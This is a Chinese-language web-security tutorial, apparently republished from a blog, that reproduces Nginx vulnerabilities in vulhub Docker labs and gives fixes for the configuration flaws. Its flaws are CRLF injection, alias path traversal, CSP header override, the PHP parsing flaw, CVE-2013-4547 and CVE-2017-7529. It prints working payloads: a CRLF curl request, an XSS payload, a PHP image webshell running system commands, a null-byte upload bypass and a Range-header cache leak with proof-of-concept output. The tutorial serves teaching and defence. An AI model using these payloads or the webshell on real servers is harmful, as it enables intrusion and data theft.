#  Web安全之Nginx常见漏洞解析   
学习网络安全到  开源聚合网络空间安全研究院   2024-03-01 17:20  
  
****  
网  
安  
教  
育  
  
培  
养  
网  
络  
安  
全  
人  
才  
  
技  
术  
交  
流  
、  
学  
习  
咨  
询  
  
  
**什么是中间件？什么是中间件漏洞？**  
  
  
  
  
中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。但是在开发使用过程中也不乏官方程序自身的一些安全问题。  
  
我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？  
  
在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。  
  
  
**web中间件 容器 服务解析：**  
  
web服务器:  
  
web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。  
  
web中间件:  
  
web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。  
  
web容器:  
  
web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。  
  
  
**常见的组件：**  
  
web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。  
  
web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。  
  
web容器：JSP容器、SERVLET容器、ASP容器等。  
  
注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。  
  
说白了，web中间件就是运行在服务器上的一个程序，它的作用是为服务器提供一个解析http或者https请求的方案。由它充当中间人，确定前端传输的信息应该交给后端哪一个文件进行处理，并向前端返回结果。  
  
对于其的操控我们大多数时候是在LINUX环境下采用配置文件对其进行控制。这就意味着某些错误的配置会引发一些安全漏洞。并且作为一款程序，也一定会存在着一些自身的安全漏洞。以上两个方向就是我们研究任何一个中间件漏洞应该具有的基本认知。  
  
今天我们先来看一看nginx出现过的一些漏洞，环境均来自vulhub官网，其为基于docker的漏洞环境集成库，对我们的学习很有帮助~  
  
  
**三个配置不当导致的nginx漏洞**  
  
  
  
  
```
1root㉿killer)-[~/vulhub/nginx/insecure-configuration/configuration]
2docker-compose up -d

```  
  
  
作为配置不当引起的漏洞，自然对所有版本的nginx都影响，这种小的问题反而很容易引起忽视。  
  
  
**1.$uri导致的crlf注入漏洞**  
  
  
下面两种情景十分常见：  
  
用户访问http://example.com/aabbcc，自动跳转到https://example.com/aabbcc  
  
用户访问http://example.com/aabbcc，自动跳转到http://www.example.com/aabbcc  
  
第二个场景主要是为了统一用户访问的域名，更加有益于SEO优化。  
  
在跳转的过程中，我们需要保证用户访问的页面不变，所以需要从Nginx获取用户请求的文件路径。查看Nginx文档，可以发现有三个表示uri的变量：  
  
$uri  
  
$document_uri  
  
$request_uri  
  
```
1location / {
2    return 302 https://$host$uri;
3}
4#因为`$uri`是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。

```  
  
  
  
解释一下，1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）。那么，如果运维配置了下列的代码：  
  
```
1location / {
2    return 302 https://$host$uri;
3}
4#因为`$uri`是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。

```  
  
  
因为$uri和$document_uri是解码以后的请求路径，所以可能就会包含换行符，也就造成了一个CRLF注入漏洞。  
  
  
1.1利用方式：  
  
  
我们在请求的过程中发送一个带有%0d%0a编码的请求：  
  
```
 1#请求内容
 2curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1
 3#测试结果
 4[root@blackstone insecure-configuration]# curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1
 5HTTP/1.1 302 Moved Temporarily
 6Server: nginx/1.13.0
 7Date: Thu, 12 Jan 2023 12:18:16 GMT
 8Content-Type: text/html
 9Content-Length: 161
10Connection: keep-alive
11Location: http://192.168.2.169:8080/
12Set-Cookie: a=1

```  
  
  
我们通过上述手段对请求进行了修改，利用此漏洞可以看到返回了一个set-cookie，也就是说错误的使用$uri配置会是用户的请求被黑客悄无声息的篡改掉。  
  
我们使用burp抓包可以看到另一种可能性：在我们发送两个连续的换行\r\n后，可以直接修改返回报文的返回体。插入js代码引发xss。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHNibViciabX1uIkZmxgq3EFcs79aYqpicvIDpKGJ4oJIIjdVTIpGPjES9hw/640?wx_fmt=png&from=appmsg "")  
  
1.2修改方案：  
  
在获取用户的请求路径时，配置文件内出现的配置应当是$request_uri,例如：  
  
```
1location / {
2    return 302 https://$host$request_uri;
3}

```  
  
  
  
因为$request_uri和上边1和2相反，表示的是完整的uri并不会解码。  
  
另外，由$uri导致的CRLF注入漏洞不仅可能出现在上述两个场景中，理论上，只要是可以设置HTTP头的场景都会出现这个问题。  
  
测试一下效果：  
  
```
 1#1.编辑配置文件，投放进docker
 2[root@blackstone configuration]# cat fix1.conf
 3server {
 4        listen 8080;
 5
 6        root /usr/share/nginx/html;
 7
 8        index index.html;
 9
10        server_name _;
11
12        location / {
13                return 302 http://$host:$server_port$request_uri;
14        }
15}
16
17#2.将配置文件放到特定目录，重启nginx
18[root@blackstone configuration]# docker exec -it fa2e43aabeec /bin/bash
19root@fa2e43aabeec:/# cp fix1.conf /etc/nginx/conf.d/
20root@fa2e43aabeec:/# rm -f /etc/nginx/conf.d/error1.conf 
21root@fa2e43aabeec:/etc/nginx/conf.d# nginx -s reload222324#3.查看效果，确实可以有效消除CRLF的影响25[root@blackstone ~]# curl -I http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1
26HTTP/1.1 302 Moved Temporarily
27Server: nginx/1.13.0
28Date: Wed, 08 Feb 2023 18:44:14 GMT
29Content-Type: text/html
30Content-Length: 161
31Connection: keep-alive
32Location: http://192.168.2.169:8080/%0d%0aSet-Cookie:%20a=1

```  
  
  
  
**2. 目录穿越漏洞：**  
  
  
这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。  
  
假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名：  
  
```
1location /files {
2    alias /home/;
3}

```  
  
  
  
2.1利用方式  
  
此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。  
  
但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHvtptgSTZhqFL0cvVwE2ibW8XiatV1A3fYB1eiaoYhH6PJrE8t10a3y1ag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHd03a0vzgLg9qiacv0ib7q0FrOSbPWQMl5YOI1icpcbTcjuOLTicW0UCxzQ/640?wx_fmt=png&from=appmsg "")  
  
此时我们就获得了一个目录穿越漏洞，他可以进行任意文件的下载，例如php mysql等等。  
  
虽然有些mysql禁止远程登录，但是可以通过mysql的用户名和密码去进行一个社工，如果MySQL的密码较为牢靠那么可能其他系统的密码也是此密码，当然这只是一个没好的臆想或者说猜测，  
  
  
2.2解决方案  
  
在进行alies配置的过程中一定保证location后的匹配路径和别名路径一致。否则就会引发这样的路径穿越漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibH9ZHCqicErHPibz21hys4JadR0icibicry4M04sMP0QdCHFkVsy5RNtOSTRQ/640?wx_fmt=png&from=appmsg "")  
  
**3.HTTP header头被覆盖：**  
  
众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。  
  
但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。  
  
如下列代码，Server块添加了CSP头：  
  
```
 1server {
 2    ...
 3    add_header Content-Security-Policy "default-src 'self'";
 4    add_header X-Frame-Options DENY;
 5
 6    location = /test1 {
 7        rewrite ^(.*)$ /xss.html break;
 8    }
 9
10    location = /test2 {
11        add_header X-Content-Type-Options nosniff;
12        rewrite ^(.*)$ /xss.html break;
13    }
14}

```  
  
  
  
但/test2的location中又添加了X-Content-Type-Options头，nginx仅载入模块内部的头部修改信息，则会导致在父块中配置的 add_header Content-Security-Policy "default-src 'self'";无法在/test2中生效。从而使/test2这里无法获得防御功能  
  
  
3.1利用方式：  
  
  
此处的漏洞环境内部，部署了xss漏洞点，通过 add_header Content-Security-Policy "default-src 'self'";头的配置理论上是可以防御XSS攻击的。但是由于此处/test2目录下的配置错误，导致这条配置不在此目录下生效。故依旧可以使用XSS进行攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHnABWiaD0ia1ia3h9aEGzBMHkU7u3Hwd09tplyYjmORJ8dnPAxnjP5INlg/640?wx_fmt=png&from=appmsg "")  
  
  
  
```
1#这是转到的JS文件，获取锚点也就是#后面的内容添加到<p>标签内部
2window.onload = function() {
3    var m = document.getElementById('m');
4    m.innerHTML = location.hash.substr(1);
5}

```  
  
  
  
这个东西会对写入的xss进行转义。  
  
所以可以利用写法可以写为：  
  
http://127.0.0.:8082/test2#<script>alert(1)</script>  
  
但是新版浏览器针对xss攻击有一些限制，我们使用旧的浏览器可以发现：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibH6bD9LFcgQibox8RuUXYomySfwABLKJbmUBTvE20gg5zS3FHmhnuEIgA/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到，实际上/test2的防御机制并未打开。不过例子中的xss触发方案已经被浏览器防御了。  
  
  
3.2修改方案：  
  
配置头部信息修改时细分到最小块，这样才能最大限度的保证每一个小块的头部配置都是正确的。当然，也可以写到父块中，但是子块在进行头部个性化修改时，切记将父块中的头配置给子块复制一份。  
  
说的更清楚一点，就是关于header的修改操作。不在nginx配置继承范围内。子块一旦修改，最终调用的配置就只在子块内部寻找。  
  
修改配置文件为：  
  
```
 1#1.直接在宿主机上修改对应文件也生效(配置文件是从宿柱机链进去的，具体可以看.yml文件)
 2[root@blackstone configuration]# pwd
 3/root/vulhub-master/nginx/insecure-configuration/configuration
 4#2.修改文件
 5[root@blackstone configuration]# cat error3.conf
 6server {
 7    listen 8082;
 8
 9    root /usr/share/nginx/html;
10
11    index index.html;
12
13    server_name _;
14
15autoindex on;
16
17add_header Content-Security-Policy "default-src 'self'";
18add_header X-Frame-Options DENY;
19
20    location = /test1 {
21            rewrite ^(.*)$ /xss.html break;
22    }
23
24location = /test2 {
25    add_header X-Content-Type-Options nosniff;
26    add_header Content-Security-Policy "default-src 'self'";
27    add_header X-Frame-Options DENY;
28    rewrite ^(.*)$ /xss.html break;
29}
30}
31#3.进入docker重启nginx
32[root@blackstone configuration]# docker exec -it fa2e43aabeec /bin/bash
33root@fa2e43aabeec:/# nginx -s reload

```  
  
  
  
再次测试的话发现text2以及无法执行script。  
  
  
**4.nginx解析漏洞：**  
  
  
严格来说，这个漏洞的出现概率约等于0，甚至让人感觉非常的刻意而为之。请看：  
  
这二者合在一起，在网页有文件上传功能时，百分百引发文件上传漏洞。属于高危配置手法。对于这个例子可能需要大家去看看nginx解析php原理。  
  
总结来说，漏洞成因就是同时开启路径修复和图片后缀名解析(或者直接将解析配置为空)  
  
```
1[root@blackstone nginx_parsing_vulnerability]# cd /root/vulhub- master/nginx/nginx_parsing_vulnerability
2[root@blackstone nginx_parsing_vulnerability]# docker-compose up -d

```  
  
  
  
Nginx解析漏洞：  
  
影响版本：全版本  
  
影响说明：命令执行，获取服务器web权限  
  
环境说明：Nginx 1.13.0  
  
环境搭建： 此次环境使用docker环境搭建，环境采用地址Vulhub  
  
  
4.1漏洞原因：  
  
Nginx的解析漏洞的出现和Nginx的版本没有关系，漏洞的产生是由于php配置问题导致的。出现了如下  
  
```
1# php.ini 目录修复，如果没找到则向上一级文件查找修复，为路径修复！
2cgi.fix_pathinfo=1
3# php-fpm.conf 开启.php后缀和.jpg后缀解析功能，或者有一个可能，他压根为off或者空，压根没写也可以解析。
4security.limit_extensions = .php .jpg

```  
  
  
  
路径修复以及PHP-fpm开启了图片jpg或者gif或者压根没开什么文件都能解析的，愚蠢  
  
当访问http://127.0.0.1/test.jpg时显示图片解析错误，当访问http://127.0.0.1/test.jpg/test.php时结果显示Access denied，这个回显很奇怪，正常访问这个链接是不存在的，正常思维应该是404，这里就需要研究下Nginx的解析流程了：Nginx在收到/test.jpg/test.php路径时，首先判断文件类型，发现后缀是.php，便交给php处理，但php想要解析该文件时，发现并不存在，便删除掉/test.php，去找test.jpg，此时test.jpg是存在的，便要尝试解析它，但无奈后缀是.jpg，不是php，便报错Access denied。 上面的流程中提到了一个点，就是删除/test.php，这是Nginx的“修理”机制，由参数cgi.fix_pathinfo决定，当值为1时，便进行“修理”。例如，文件名为/aa.jpg/bb.png/cc.php，如果cc.php不存在就找/aa.jpg/bb.png，如果还不存在就找aa.jpg，如果存在将它视为php文件。 到目前为止我们并没有成功利用解析漏洞，因为php代码并没有执行。为什么呢？ 因为在PHP的配置中没有定义降.jpg文件中的php代码也解析为php，这是在security.limit_extensions中定义的。由于security.limit_extensions的引入，漏洞难以利用。  
  
演示如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHASwlKecRqfburosTVo2HCZ8BwaqM2oUQE6BK8jjCIqOKHHl0nas6FQ/640?wx_fmt=png&from=appmsg "")  
  
  
加一个/.php试试？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHQibcc5LmvQr5sRuRFRjLauQ9pPQFoEI2u9uObwUnGSAwsMzLiauia324A/640?wx_fmt=png&from=appmsg "")  
  
  
ok，就是这么简单。不过这玩意出现不太可能。  
  
能够实现这个效果得益于愚蠢的配置。  
  
我们可以构造一个<?php phpinfo(); system($_GET['var']); ?>图片马，则可以完成var=whomai  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHO7RJkfibIqdKdyb25YEl9X1B5zrQELIvLicPPYicpUR7yTZUubxnWQHPA/640?wx_fmt=png&from=appmsg "")  
  
  
**5.nginx本身的漏洞**  
  
  
对于程序本身的漏洞我们能做的就是版本升级，时刻保持程序为最新版，才有可能把风险降到最低。对于以下漏洞的修复方案就不在赘述。  
  
  
5.1文件名逻辑漏洞（CVE-2013-4547）  
  
影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7  
  
环境位置：/nginx/CVE-2013-4547  
  
Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7  
  
php-fpm.conf中的security.limit_extensions为空，也就是说任意后缀名都可以解析为PHP  
  
  
5.1.1漏洞原因  
  
Nginx版本范围较大，比较好匹配，但php-fpm.conf的security.limit_extensions配置默认为php，一般鲜有管理员允许所有类型都可以解析为PHP，所以该漏洞比较鸡肋，但这是在Linux的服务器中，而在Windows中便影响极大，这点我们后面再讲，先说下在Linux下的复现步骤。  
  
  
5.1.1.1漏洞前置知识  
  
要理解这个漏洞我们先需要了解nginx解析php的原理，放一张图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHl4I4ZeolTrIH3nuARjokiatD50Nr1Hl6rc1LJKhXSKr40XkxR4MBf0g/640?wx_fmt=png&from=appmsg "")  
  
  
图中的几个定义：  
  
CGI：CGI是一种协议，它定义了Nginx或者其他Web Server传递过来的数据格式，全称是（Common Gateway Interface，CGI），CGI是一个独立的程序，独立与WebServer之外，任何语言都可以写CGI程序，例如C、Perl、Python等。  
  
FastCGI：FastCGI是一种协议，它的前身是CGI，可以简单的理解为是优化版的CGI，拥有更够的稳定性和性能。  
  
PHP-CGI：只是一个PHP的解释器，本身只能解析请求，返回结果，不会做进程管理。  
  
PHP-FPM：全称FastCGI Process Manager，看名称就可以知道，PHP-FPM是FastCGI进程的管理器，但前面讲到FastCGI是协议并不是程序，所以它管理的是PHP-CGI，形成了一个类似PHP-CGI进程池的概念。  
  
Wrapper：字母意思是包装的意思，包装的是谁呢？包装的是FastCGI，通过FastCGI接口，Wrapper接收到请求后，会生成一个新的线程调用PHP解释器来处理数据。  
  
Nginx调用PHP的过程是比较复杂的，需要花大量的时间来学习和梳理。通过原理图和刚才的定义，我们对Nginx处理PHP请求有了大致的了解。那么，Nginx是如何知道将什么样的文件当作PHP文件处理？是在nginx.conf配置文件中的：  
  
```
1location ~ \.php$ {
2root           html;
3include        fastcgi_params;
4
5fastcgi_pass   IP:9000;
6fastcgi_index  index.php;
7fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
8fastcgi_param  DOCUMENT_ROOT /var/www/html;
9}

```  
  
  
  
locating后边的 \.php是一个正则，代表了以.php结尾的文件都必须按照括号内的命令来执行，fastcgi是一个协议，具象化理解为nginx和php之间的一个媒介一个沟通交流方式，有点想路由协议但又不全是。nginx将请求通过fastcgi发送给PHP-fpm。其中nginx和fastcgi_pass可以不在同一台服务器上，用fastcgi_pass以ip和port端口的方式进行通信功能。  
  
  
5.1.1.2漏洞引发条件：  
  
作为相应版本的程序，其在解析URL时存在一定的缺陷，我们请求wbe-php.jpg[0x20][0x00].php，这个URI可以匹配上正则\.php$，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是1.jpg[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。也就是说后端的php代码在处理的过程中所接受到的文件名就是web-php.jpg。  
  
同时查看php-fpm的配置文件可以看到：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHzRic30RqibYkvfjNS1ouhPtFBHvhaYydZZsKIibDv1eAR3TyurAYNgUag/640?wx_fmt=png&from=appmsg "")  
  
  
我们来看一下官方配置文件给出的建议：  
  
```
 1[root@blackstone php-fpm]# vim /etc/php-fpm.d/www.conf
 2
 3; Limits the extensions of the main script FPM will allow to parse. This can
 4; prevent configuration mistakes on the web server side. You should only limit
 5; FPM to .php extensions to prevent malicious users to use other extensions to
 6; exectute php code.
 7#这一句是重点，在设置解析时，为空则表示允许所有的后缀解析
 8; Note: set an empty value to allow all extensions.
 9; Default Value: .php
10;security.limit_extensions = .php .php3 .php4 .php5

```  
  
  
在此漏洞的加持下，我们可以利用对nginx对截断符号的错误判断，可以轻松上传非法文件绕过php对其的检测，在加上php-fpm配置文件中的错误配置。就有可能实现上传非法的webshell或者实现RCE。  
  
  
5.1.2如何实际利用：  
  
开启靶场：docker-compose -d  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHEiaIHH8FW82jNG7qoQq6tCzFKJ02HvJrfVzaz3p1ZKFQs6r8bxp1hTg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHrKf4ZFsJrpBbribmaa4yWsN5SMib1BSynOYtLKHRsbVCFCjsJXc3Zvtg/640?wx_fmt=png&from=appmsg "")  
  
这个文件上传点，看一下源码发现对其做了严格但是又不严格的限制：  
  
```
 1<?php 2if (!empty($_FILES)): 3 4// Check for errors 5if($_FILES['file_upload']['error'] > 0){ 6    die('An error ocurred when uploading.'); 7} 8 9// Check filesize10if(!is_uploaded_file($_FILES['file_upload']['tmp_name'])) {11    die('File is not uploaded file');12}1314//字符过滤防御文件上传漏洞15$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);16if (empty($ext) || in_array($ext, ['php', 'php3', 'php5', 'phtml'])) {17    die('Unsupported filetype uploaded.');18}1920$new_name = __DIR__ . '/uploadfiles/' . $_FILES['file_upload']['name'];21if(!move_uploaded_file($_FILES['file_upload']['tmp_name'], $new_name)){22    die('Error uploading file - check destination is writeable.');23}2425die('File uploaded successfully: ' . $new_name);2627else:28?>
29<form method="post" enctype="multipart/form-data">
30    File: <input type="file" name="file_upload">
31    <input type="submit">
32</form>
33<?php34endif35

```  
  
  
但是我们可以利用cev-2013-4547来绕过。  
  
用vscode构造一个jpg文件里边包含php的get方法。 开启环回代理使用burp抓到上传的包，如下：  
  
找到jgp.php文件的那一行，2e代表 . 70 60 70代表php（16机制），给前边添加20 和00代表空格和阶段，类似于上边c语言的[0x20][0x00]  
  
ps：因为php是使用c编写的，所以c的一些内容php是可以识别的  
  
欧克改完只够go一下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibH5VW7VZY7Dd8Gfl8PJiaKlDT3x89TqibCHJkfhE5er9V8vNJoJuiaKJuUw/640?wx_fmt=png&from=appmsg "")  
  
  
可以发现改上传成功的了jpg后边有一个空格，截断看不见~  
  
但这只是上传，上传完之后我们访问该文件的时候需要在后缀加入php即执行攻击命令。如果在图片文件中嵌入system[$get'var']这种后果自然而然~  
  
  
5.2Nginx越界读取缓存漏洞（CVE-2017-7529）  
  
影响版本：Nginx 0.5.6 ~ 1.13.2  
  
影响说明：信息泄漏  
  
环境说明：Nginx 1.13.2  
  
环境搭建： 此次环境使用docker环境搭建，环境采用地址Vulhub  
  
  
5.2.1 引发原因  
  
Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。  
  
如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。  
  
说实话，这样的漏洞危害几乎为0，因为缓存下来的文件通常为自己的静态文件，并不敏感。但是确实造成了用户的缓存信息泄露。值得一看。  
  
Nginx越界读取缓存漏洞产生的原因是Nginx读取http请求时，如果包含range，那么Nginx会根据range指定的数据范围读取文件数据内容，如果该range是负数，并且读到了缓存文件，那么会返回缓存文件中的“文件头”或“HTTP返回包头”，缓存文件头可能包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。  
  
  
5.2.2概念介绍：  
  
0×1  
  
HTTP返回包头：就是httprespons  
  
HTTP返回包体：就是请求的具体文件，例如出来个网页资源，网页内嵌套的内容等等。  
  
content-range是什么？  
  
range是什么？ 存在于HTTP请求头中，表示请求目标资源的部分内容，例如请求一个图片的前半部分，单位是byte，原则上从0开始，但今天介绍的是可以设置为负数。 range的典型应用场景例如：断点续传、分批请求资源。  
  
content-range的表达方式：  
  
Range:bytes=0-1024  表示访问第0到第1024字节；  
  
Range:bytes=100-200,601-999,-300 表示分三块访问，分别是100到200字节，601到600字节，最后的300字节；  
  
Range:-100 表示访问最后的100个字节  
  
range在HTTP Response表示：  
  
Accept-Ranges:bytes 表示接受部分资源的请求；  
  
Content-Range: bytes START-END/SIZE  START-END表示资源的开始和结束位置，SIZE表示资源的的长度  
  
什么是缓存？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHEQ0MuXh96jY8CP4HW0Sru1UrL7LnYWLI7jHNwc1gzvavnPn28Ymj2w/640?wx_fmt=png&from=appmsg "")  
  
  
分布式缓存介绍  
  
当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。 例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。 例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHJj5Vib8Thqiax6QlGNt3AmmGRUojSWDxB0Xia5qReTlqBkXNgoiaaqLA2Q/640?wx_fmt=png&from=appmsg "")  
  
  
再次访问该页面时会首先读取该缓存内容，其他的静态资源，例如：图片、CSS、JS等都会被缓存。  
  
  
5.2.3漏洞利用：  
  
1 .现在我要读取刚才讲到的缓存文件头，他的Content-Length时612，那么我读取正常缓存文件的range是设置为  
  
```
1Range: bytes=0-612

```  
  
  
使用curl工具测试下，命令如下,执行后发现，返回的内容是正常的。  
  
```
1curl -i http://127.0.0.1:8080 -r 0-612

```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnaoZlibT2ba69W406SSZyNibHbfp5SnlK6DCyks3xrH8N2YLPrHJehwHTgbhEEkicaydtibbRHu3iaK5yw/640?wx_fmt=png&from=appmsg "")  
  
  
2. 接下来要读取缓存头，读取前面600个字节，也就是  
  
```
1range=content_length + 偏移长度
2即：
3range = 612 + 600
4取负值为-1212

```  
  
  
此时知道range的start是-1212，那么end呢？nginx的源码在声明start,end时用的是64位有符号整型，所以最大可表示：  
  
```
1-2^63-2^63-1
2也就是
3-9223372036854775808 到 9223372036854775807

```  
  
  
所以只要start+end为9223372036854775807即可，故：  
  
```
1end = 9223372036854775808 - 1212
2取负
3为-9223372036854774596

```  
  
  
执行结果为下图，可以发现读取到了缓存文件头，里面的8081端口在实际的业务场景中可能是其他的地址，这样便会造成信息泄漏。  
  
```
 1[root@blackstone CVE-2017-7529]# python3 poc.py http://192.168.247.150:8080/
 2
 3--00000000000000000002
 4Content-Type: text/html; charset=utf-8
 5Content-Range: bytes -605-611/612
 6
 7A@�cb`RY�=�cr�\me"59526062-264"
 8KEY: http://127.0.0.1:8081/
 9HTTP/1.1 200 OK
10Server: nginx/1.13.2
11Date: Thu, 09 Feb 2023 00:27:21 GMT
12Content-Type: text/html; charset=utf-8
13Content-Length: 612
14Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT
15Connection: close
16ETag: "59526062-264"
17Accept-Ranges: bytes
18<!DOCTYPE html>
19<html>
20<head>
21<title>Welcome to nginx!</title>
22<style>23    body {24        width: 35em;25        margin: 0 auto;26        font-family: Tahoma, Verdana, Arial, sans-serif;27    }28</style>
29    </head>
30<body>
31<h1>Welcome to nginx!</h1>
32<p>If you see this page, the nginx web server is successfully installed and
33working. Further configuration is required.</p>
34<p>For online documentation and support please refer to
35<a href="http://nginx.org/">nginx.org</a>.<br/>
36Commercial support is available at
37<a href="http://nginx.com/">nginx.com</a>.</p>
38<p><em>Thank you for using nginx.</em></p>
39</body>
40</html>
41--00000000000000000002
42Content-Type: text/html; charset=utf-8
43Content-Range: bytes -9223372036854773979-611/612

```  
  
  
  
END  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rCukMxCXicnZ0MH2WNicYnwJAibtGhLB3tnSbN7L04doUSkPIqZgEibfib7Vs5hXiaicFeLicUlQxy9Tic49CHbcPlSIRzA/640?wx_fmt=png "")  
  
  
版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。  
  
原文链接：https://blog.csdn.net/qtttgeq/article/details/129699274  
  
版权声明：著作权归作者所有。如有侵权请联系删除  
  
  
网安训练营  
  
网络安全基础班、实战班线上全面开启，学网络安全技术、升职加薪……有兴趣的可以加入网安大家庭，一起学习、一起成长，考证书求职加分、升级加薪，有兴趣的可以咨询客服小姐姐哦！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rCukMxCXicnYQFVIuFicd4kaXTjVEypCqpIElc61joHndXXvXJrSKDvQ6cwiauBSMqaSDtagY12q72whiak6aVvmyg/640?wx_fmt=jpeg "")  
  
加QQ（1005989737）找小姐姐私聊哦  
  
**精选文章**  
  
  
  
环境搭建  
  
Python  
  
学员专辑  
  
信息收集  
  
CNVD  
  
安全求职  
  
渗透实战  
  
CVE  
  
高薪揭秘  
  
渗透测试工具  
  
网络安全行业  
  
神秘大礼包  
  
**基础教程**  
  
我们贴心备至  
  
**用户答疑**  
  
 QQ在线客服  
  
**加入社群**  
  
QQ+微信等着你  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rCukMxCXicnbaLbcYgxPEznaLZeyyXugCM0jZW8xpLygice6Qnle72W2jFDsr0V8VTsf4otSh7jEH5lJH9icdiaKpQ/640?wx_fmt=jpeg "")  
  
  
**我就知道你“在看”**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/rCukMxCXicnaJbqicEeFlobznozfm72D79VrDP7Z5o6icc8SVia8haOeSC8wakd8Wo4LboXV8DFgJP5Xf0fcPD1BHA/640?wx_fmt=gif "")  
  
  
  
